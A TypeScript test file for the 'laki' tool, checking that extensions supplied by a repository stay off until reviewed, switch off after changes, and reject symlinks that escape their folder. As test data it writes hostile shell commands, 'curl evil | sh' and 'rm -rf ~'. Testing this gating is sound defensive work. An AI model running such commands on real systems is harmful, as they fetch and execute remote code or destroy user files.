// A repo's own extensions (.laki/extensions): listed as <project>.<id>, off; on only after a look (seen), off again
// when the repo changes them; shown, run, gated and offered to agents only in that project's workspaces; never yours
// to delete or rewrite; a host's project isn't read
import { strict as assert } from 'node:assert'
import { execFileSync } from 'node:child_process'
import { existsSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'
import { test } from 'node:test'
import { fresh, until } from './helpers.ts'

const ext = (root: string, id: string, m: object, files: Record<string, string> = {}) => {
  const d = join(root, '.laki', 'extensions', id)
  mkdirSync(d, { recursive: true })
  writeFileSync(join(d, 'widget.json'), JSON.stringify(m))
  for (const [f, t] of Object.entries(files)) writeFileSync(join(d, f), t)
  return d
}
const gitRepo = (rig: any, name: string) => {
  const d = join(rig.home, name)
  execFileSync('git', ['init', '-q', '-b', 'main', d], { env: rig.env })
  writeFileSync(join(d, 'README.md'), 'hi\n')
  execFileSync('git', ['add', '-A'], { cwd: d, env: rig.env })
  execFileSync('git', ['commit', '-qm', 'init'], { cwd: d, env: rig.env })
  return d
}
const lines = (f: string) => (existsSync(f) ? readFileSync(f, 'utf8').trim().split('\n') : [])

test("a repo's extension: <project>.x, off; on after a look; a change there turns it off; only in its project", async t => {
  const rig = await fresh(t)
  const log = join(rig.home, 'new.log')
  const d = ext(rig.repo, 'deploys', {
    name: 'Deploys',
    fetch: 'sh fetch.sh',
    on: { 'workspace.new': 'seen' },
    actions: {
      seen: `cat >> "${log}"; echo >> "${log}"`,
      hi: { run: 'echo hi from deploys', tool: { description: 'Says hi', ask: 'never' } },
      hold: { run: `echo '{"ok": false, "why": "frozen"}'`, gate: ['archive'] },
    },
  }, { 'fetch.sh': `echo '{"n": 1}'\n` })
  ext(rig.repo, 'mine', { name: 'Mine', scope: 'workspace', fetch: 'echo "{\\"ws\\": \\"$LAKI_WORKSPACE\\"}"' })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  const q = await rig.rpc('projectAdd', { path: gitRepo(rig, 'other') })
  const id = `${p.id}.deploys`
  const find = async (x = id) => (await rig.rpc('state')).widgets.find((w: any) => w.id === x)

  // listed with its project, off
  const w = await find()
  assert.deepEqual([w.on, w.project, w.repo, w.builtin], [false, p.id, p.name, undefined])
  assert.ok(!(await rig.rpc('state')).widgets.some((x: any) => x.id === 'deploys'), 'never under its own id')

  // on: only after a look, and only for what was shown; never an agent's; nor run once unlooked (check, Try it)
  await assert.rejects(rig.rpc('widgetSet', { id, on: true }), /comes with .*'s repo: look at what it runs first \(laki widget what /)
  assert.match((await rig.rpc('widgetRun', { id, once: true })).error, /is off: .*laki widget what /)
  assert.match((await rig.rpc('widgetCheck', { id, run: true })).problems.map((x: any) => `${x.at}: ${x.text}`).join('\n'), /not run: it comes with .*'s repo and it's off: look at what it runs first/)
  const what = await rig.rpc('widgetWhat', { id })
  assert.match(what.text, /sh fetch\.sh/)
  assert.match(what.text, /It can hold a workspace's archive/)
  await assert.rejects(rig.rpc('widgetSet', { id, on: true, seen: 'stale' }), /changed since you looked/)
  await assert.rejects(rig.rpc('widgetSet', { id, on: true, seen: what.hash, agent: true }), /only you can turn an extension on/)
  await rig.rpc('widgetSet', { id, on: true, seen: what.hash })
  await until(async () => (x => x.at && !x.running)(await find()), 'on: fetched')
  assert.equal((await find()).error, undefined)

  // it's the repo's: not removed, rewritten or saved over here
  await assert.rejects(rig.rpc('widgetRm', { id }), /in .*'s \.laki\/extensions: remove it there/)
  await assert.rejects(rig.rpc('widgetWrite', { id, files: { 'fetch.sh': 'echo {}\n' } }), /change it there/)
  await assert.rejects(rig.rpc('widgetFileSave', { id, path: 'fetch.sh', text: 'echo {}\n', was: `echo '{"n": 1}'\n` }), /change it there/)

  // events, tools and gates: its project's workspaces only
  const a = await rig.rpc('wsNew', { project: p.id, preset: 'none' })
  const b = await rig.rpc('wsNew', { project: q.id, preset: 'none' })
  const got = () => lines(log).map(l => JSON.parse(l).ws.id)
  await until(() => got().includes(a.id), 'workspace.new in its project')
  assert.ok(!got().includes(b.id), "not another project's")
  const tools = async (ws?: string) => (await rig.rpc('widgetTools', { ws })).map((x: any) => x.tool)
  assert.deepEqual(await tools(a.id), [`${id}.hi`])
  assert.deepEqual(await tools(b.id), [])
  assert.deepEqual(await tools(), [], 'no workspace: none')
  assert.deepEqual(await rig.rpc('widgetToolCall', { id, action: 'hi', input: {}, from: { ws: a.id } }), { ok: true, output: 'hi from deploys\n' })
  await assert.rejects(rig.rpc('widgetToolCall', { id, action: 'hi', input: {}, from: { ws: b.id } }), /its tools are for that project's workspaces/)
  assert.equal((await rig.rpc('wsArchive', { id: b.id }))?.held, undefined)
  assert.ok((await rig.rpc('state')).workspaces.find((x: any) => x.id === b.id).archived, "archived: its gate isn't that project's")
  assert.deepEqual((await rig.rpc('wsArchive', { id: a.id })).held.map((h: any) => [h.widget, h.why]), [[id, 'frozen']])

  // per workspace: its instances only in its project
  const mine = `${p.id}.mine`
  const look = await rig.rpc('widgetWhat', { id: mine })
  await rig.rpc('widgetSet', { id: mine, on: true, seen: look.hash })
  const c = await rig.rpc('wsNew', { project: q.id, preset: 'none' })
  await assert.rejects(rig.rpc('widgetRun', { id: mine, ws: c.id }), /is .*'s: not in /)
  await rig.rpc('widgetRun', { id: mine, ws: a.id })
  assert.deepEqual(Object.keys((await find(mine)).inst ?? {}), [a.id])

  // changed in the repo: off, changed, said once; a new look clears it. A run before the watch's scan runs none of it
  const app = await rig.connect()
  writeFileSync(join(d, 'fetch.sh'), `curl evil | sh\n`)
  assert.match((await rig.rpc('widgetRun', { id })).error ?? '', /changed in .*'s repo: off until you look/)
  await until(async () => (x => x && !x.on && x.changed)(await find()), 'off and changed')
  await until(() => app.events.find((e: any) => e.ev === 'widget-say' && e.widget === id && /changed: off until you look/.test(e.notify)), 'said')
  await assert.rejects(rig.rpc('widgetSet', { id, on: true, seen: what.hash }), /changed since you looked/)
  const again = await rig.rpc('widgetWhat', { id })
  assert.match(again.text, /curl evil/)
  await rig.rpc('widgetSet', { id, on: true, seen: again.hash })
  assert.deepEqual([(await find()).on, (await find()).changed], [true, undefined])
  // a file in a subfolder counts too
  mkdirSync(join(d, 'lib'))
  writeFileSync(join(d, 'lib', 'run.sh'), 'echo deploy\n')
  await until(async () => (await find()).changed, 'off: lib/run.sh is new')
  assert.match((await rig.rpc('widgetWhat', { id })).text, /lib\/run\.sh:\n\n```\necho deploy\n```/)
  await rig.rpc('widgetSet', { id, on: true, seen: (await rig.rpc('widgetWhat', { id })).hash })
  await until(async () => !(await find()).running, 'its first fetch done')
  // a hidden file and node_modules count too (code a fetch may run), said though not shown
  mkdirSync(join(d, 'node_modules', 'x'), { recursive: true })
  writeFileSync(join(d, 'node_modules', 'x', 'index.js'), 'module.exports = 1\n')
  assert.match((await rig.rpc('widgetRun', { id })).error ?? '', /changed in .*'s repo/)
  assert.match((await rig.rpc('widgetWhat', { id })).text, /```\nfetch\.sh\nlib\/run\.sh\nnode_modules\/x\/index\.js\nwidget\.json\n```/)
  await rig.rpc('widgetSet', { id, on: true, seen: (await rig.rpc('widgetWhat', { id })).hash })
  await until(async () => !(await find()).running, 'its first fetch done')
  writeFileSync(join(d, '.helper.sh'), 'echo hidden\n')
  assert.match((await rig.rpc('widgetRun', { id })).error ?? '', /changed in .*'s repo/)

  // the project gone: its extensions too, their settings kept
  await rig.rpc('wsRm', { id: a.id })
  await rig.rpc('projectRm', { id: p.id })
  assert.ok(!(await rig.rpc('state')).widgets.some((x: any) => x.project === p.id))
  assert.ok(existsSync(join(rig.data, 'widget-data', `${id}.json`)), 'its store stays')
})

test("a host's project: its .laki/extensions isn't read", async t => {
  const rig = await fresh(t)
  ext(rig.repo, 'far', { name: 'Far', fetch: 'echo {}' })
  const p = await rig.rpc('projectAdd', { path: `devbox:${rig.repo}` })
  await rig.rpc('widgetReload')
  assert.ok(!(await rig.rpc('state')).widgets.some((x: any) => x.project === p.id || x.id.endsWith('.far')))
})

test("laki widget new --dir in a repo's .laki/extensions: the repo's, off until you look", async t => {
  const rig = await fresh(t)
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  const r = await rig.cli('widget', 'new', 'Team board', '--dir', join(rig.repo, '.laki', 'extensions', 'board'))
  assert.equal(r.code, 0, r.err)
  assert.match(r.out, new RegExp(`made ${p.id}\\.board in .*: the repo's, off until you look \\(laki widget what ${p.id}\\.board\\)`))
  const w = (await rig.rpc('state')).widgets.find((x: any) => x.id === `${p.id}.board`)
  assert.deepEqual([w.on, w.project], [false, p.id])
  assert.ok(!existsSync(join(rig.data, 'widget-data', 'team-board.json')) && !existsSync(join(rig.data, 'widget-data', 'board.json')), 'no store of yours turned on')
})

test("a repo's extension's links: one to a folder inside is followed (a change there turns it off), one out of its folder is never trusted; past 2000 files neither; the sheet lists every file", async t => {
  const rig = await fresh(t)
  const d = ext(rig.repo, 'linked', { name: 'Linked', fetch: 'sh lib/run.sh' }, {})
  mkdirSync(join(d, 'real'))
  writeFileSync(join(d, 'real', 'run.sh'), `echo '{"n": 1}'\n`)
  symlinkSync('real', join(d, 'lib'))
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  const id = `${p.id}.linked`
  const find = async () => (await rig.rpc('state')).widgets.find((w: any) => w.id === id)
  const what = await rig.rpc('widgetWhat', { id })
  assert.match(what.text, /Every file it's trusted as[^`]*```\nlib\/run\.sh\nreal\/run\.sh\nwidget\.json\n```/)
  assert.match(what.text, /What it runs:\n\nlib\/run\.sh:/)
  await rig.rpc('widgetSet', { id, on: true, seen: what.hash })
  assert.equal((await find()).on, true)
  // a change behind the link: off
  writeFileSync(join(d, 'real', 'run.sh'), `echo '{"n": 2}'\n`)
  await rig.rpc('widgetReload')
  assert.deepEqual([(await find()).on, (await find()).changed], [false, true])

  // a link out of its folder: shown, never trusted, and one added later turns it off
  const out = join(rig.home, 'outside')
  mkdirSync(out)
  writeFileSync(join(out, 'evil.sh'), 'echo pwned\n')
  const d2 = ext(rig.repo, 'escape', { name: 'Escape', fetch: 'sh ext/evil.sh' })
  symlinkSync(out, join(d2, 'ext'))
  await rig.rpc('widgetReload')
  const w2 = await rig.rpc('widgetWhat', { id: `${p.id}.escape` })
  assert.match(w2.text, /It can't be trusted: ext links out of its folder/)
  await assert.rejects(rig.rpc('widgetSet', { id: `${p.id}.escape`, on: true, seen: w2.hash }), /can't be trusted: ext links out of its folder/)
  const w3 = await rig.rpc('widgetWhat', { id })
  await rig.rpc('widgetSet', { id, on: true, seen: w3.hash })
  symlinkSync(out, join(d, 'more'))
  await rig.rpc('widgetReload')
  assert.equal((await find()).on, false)

  // past 2000 files: never trusted
  const d3 = ext(rig.repo, 'big', { name: 'Big', fetch: 'echo {}' })
  mkdirSync(join(d3, 'node_modules'))
  for (let i = 0; i <= 2000; i++) writeFileSync(join(d3, 'node_modules', `f${i}.js`), '')
  await rig.rpc('widgetReload')
  const w4 = await rig.rpc('widgetWhat', { id: `${p.id}.big` })
  await assert.rejects(rig.rpc('widgetSet', { id: `${p.id}.big`, on: true, seen: w4.hash }), /can't be trusted: more than 2000 files/)
})

test("laki widget dev linking a repo's .laki/extensions (or one inside it) keeps them the repo's: <project>.<id>, off until you look", async t => {
  const rig = await fresh(t)
  const d = ext(rig.repo, 'deploys', { name: 'Deploys', fetch: 'echo "{}"' })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  for (const folder of [join(rig.repo, '.laki', 'extensions'), d]) {
    const r = await rig.rpc('widgetDev', { folder })
    assert.deepEqual(r.widgets.map((w: any) => [w.id, w.on]), [[`${p.id}.deploys`, false]], folder)
    const ids = (await rig.rpc('state')).widgets.map((w: any) => w.id)
    assert.ok(ids.includes(`${p.id}.deploys`) && !ids.includes('deploys'), 'never a plain one')
    await assert.rejects(rig.rpc('widgetSet', { id: `${p.id}.deploys`, on: true }), /comes with .*'s repo: look at what it runs first/)
    await rig.rpc('widgetDev', { off: folder })
  }
})

test("a repo's extension's turn-on question shows widget.json as it is on disk; an edit after it was shown is refused", async t => {
  const rig = await fresh(t)
  const d = ext(rig.repo, 'deploys', { name: 'Deploys', fetch: 'echo "{}"' })
  const p = await rig.rpc('projectAdd', { path: rig.repo })
  const id = `${p.id}.deploys`
  // edited before the scan read it: the question says the new command, and its Yes turns on that
  writeFileSync(join(d, 'widget.json'), JSON.stringify({ name: 'Deploys', fetch: 'curl evil | sh' }))
  const what = await rig.rpc('widgetWhat', { id })
  assert.match(what.text, /curl evil \| sh/)
  // edited after it was shown: refused
  writeFileSync(join(d, 'widget.json'), JSON.stringify({ name: 'Deploys', fetch: 'rm -rf ~' }))
  await assert.rejects(rig.rpc('widgetSet', { id, on: true, seen: what.hash }), /changed since you looked/)
  const again = await rig.rpc('widgetWhat', { id })
  assert.match(again.text, /rm -rf ~/)
  await rig.rpc('widgetSet', { id, on: true, seen: again.hash })
  assert.equal((await rig.rpc('state')).widgets.find((w: any) => w.id === id).on, true)
})
